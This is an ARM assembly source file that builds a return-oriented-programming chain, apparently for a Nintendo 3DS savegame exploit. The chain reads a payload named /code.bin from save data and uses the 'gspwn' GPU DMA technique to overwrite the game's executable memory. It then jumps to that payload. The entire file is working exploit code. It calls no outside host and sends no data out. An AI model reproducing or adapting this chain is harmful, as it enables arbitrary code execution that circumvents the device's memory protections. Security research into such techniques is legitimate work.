.nds

.include "coe_save/coe_constants.s"
.include "coe_save/coe_macros.s"

.create "build/rop.bin",COE_ROP_BASE

rop:
    ; Read initial payload from savegame to linear
    FSUSER_OpenFileDirectly file_handle, 0, ARCHIVE_SAVEDATA, PATH_EMPTY, empty_string, 0x1, PATH_ASCII, payload_file, (payload_file_end - payload_file), FS_OPEN_READ, 0x0
    FSFILE_GetSize file_handle, payload_size
    FSFILE_Read file_handle, payload_bytes_read, 0, 0, LINEAR_BUFFER+0x10000, payload_size
    FSFILE_Close file_handle

    ; Flush to RAM
    flush_dcache LINEAR_BUFFER, 0x00100000

    ; DMA payload
    gspwn (COE_CODE_LINEAR_BASE + (PAYLOAD_VA - 0x00100000)), LINEAR_BUFFER+0x10000, 0x4000
    svcSleepThread 200*1000*1000, 0

    ; Jump to payload
    .word PAYLOAD_VA

    .word 0xDEAF0000

file_handle:
    .word 0x0

empty_string:
    .word 0x0

payload_size:
    .word 0x0
    .word 0x0

payload_bytes_read:
    .word 0x0
    .word 0x0

payload_file:
    .ascii "/code.bin",0
payload_file_end:

.close
